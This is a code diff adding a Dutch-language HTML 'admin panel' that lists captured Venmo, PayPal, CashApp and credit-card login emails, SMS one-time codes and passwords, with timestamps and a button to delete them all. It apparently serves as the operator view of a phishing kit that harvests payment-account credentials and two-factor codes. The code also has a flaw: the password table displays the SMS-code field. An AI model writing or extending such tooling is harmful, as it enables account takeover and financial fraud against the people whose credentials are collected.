@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <link rel="stylesheet" href="admin.css">
+  <meta charset="UTF-8">
+  <title>Admin Panel</title>
+  <style>
+    /* Jouw stijlcode blijft hier, zie eerder in de upload */
+  </style>
+</head>
+<body>
+  <div class="panel">
+    <h1>Admin Panel - Gegevens</h1>
+    
+    <!-- Venmo Tabel -->
+    <h2>Venmo Login Gegevens</h2>
+    <table id="venmoTable">
+      <thead>
+        <tr>
+          <th>Email</th>
+          <th>SMS Code</th>
+          <th>Tijdstip</th>
+        </tr>
+      </thead>
+      <tbody id="venmoData"></tbody>
+    </table>
+
+    <!-- PayPal Tabel -->
+    <h2>PayPal Login Gegevens</h2>
+    <table id="paypalTable">
+      <thead>
+        <tr>
+          <th>Email</th>
+          <th>SMS Code</th>
+          <th>Tijdstip</th>
+        </tr>
+      </thead>
+      <tbody id="paypalData"></tbody>
+    </table>
+
+    <!-- CashApp Tabel -->
+    <h2>CashApp Login Gegevens</h2>
+    <table id="cashAppTable">
+      <thead>
+        <tr>
+          <th>Email</th>
+          <th>SMS Code</th>
+          <th>Tijdstip</th>
+        </tr>
+      </thead>
+      <tbody id="cashAppData"></tbody>
+    </table>
+
+    <!-- Creditcard Tabel -->
+    <h2>Creditcard Login Gegevens</h2>
+    <table id="creditCardTable">
+      <thead>
+        <tr>
+          <th>Email</th>
+          <th>SMS Code</th>
+          <th>Tijdstip</th>
+        </tr>
+      </thead>
+      <tbody id="creditCardData"></tbody>
+    </table>
+
+    <!-- Password Tabel (voor wachtwoordgegevens) -->
+    <h2>Password Login Gegevens</h2>
+    <table id="passwordTable">
+      <thead>
+        <tr>
+          <th>Email</th>
+          <th>Wachtwoord</th>
+          <th>Tijdstip</th>
+        </tr>
+      </thead>
+      <tbody id="passwordData"></tbody>
+    </table>
+
+    <!-- Verwijder alles knop -->
+    <button onclick="clearAllData()">Verwijder Alle Gegevens</button>
+  </div>
+
+  <script>
+    // Functie om gegevens uit localStorage te lezen en weer te geven in de tabel
+    function displayData(storageKey, tbodyId) {
+      const data = JSON.parse(localStorage.getItem(storageKey)) || [];
+      const tableBody = document.getElementById(tbodyId);
+
+      // Leeg de tabel voordat je nieuwe gegevens toevoegt
+      tableBody.innerHTML = '';
+
+      data.forEach(entry => {
+        const row = document.createElement('tr');
+        row.innerHTML = `
+          <td>${entry.email || '(leeg)'}</td>
+          <td>${entry.smsCode || '(geen code)'}</td>
+          <td>${entry.time || '(geen tijd)'}</td>
+        `;
+        tableBody.appendChild(row);
+      });
+    }
+
+    // Toon de gegevens voor Venmo, PayPal, CashApp en Creditcard
+    displayData('venmo_logins', 'venmoData');
+    displayData('paypal_logins', 'paypalData');
+    displayData('cashapp_logins', 'cashAppData');
+    displayData('creditcard_logins', 'creditCardData');
+
+    // Toon de gegevens voor password_logins (wachtwoordgegevens)
+    displayData('password_logins', 'passwordData');
+
+    // Functie om alle gegevens in localStorage te wissen
+    function clearAllData() {
+      if (confirm("Weet je zeker dat je alle gegevens wilt verwijderen?")) {
+        localStorage.removeItem('venmo_logins');
+        localStorage.removeItem('paypal_logins');
+        localStorage.removeItem('cashapp_logins');
+        localStorage.removeItem('creditcard_logins');
+        localStorage.removeItem('password_logins');
+        
+        // Verfris de tabel zonder de pagina te herladen
+        displayData('venmo_logins', 'venmoData');
+        displayData('paypal_logins', 'paypalData');
+        displayData('cashapp_logins', 'cashAppData');
+        displayData('creditcard_logins', 'creditCardData');
+        displayData('password_logins', 'passwordData');
+        
+      }
+    }
+  </script>
+  
+</body>
+</html>
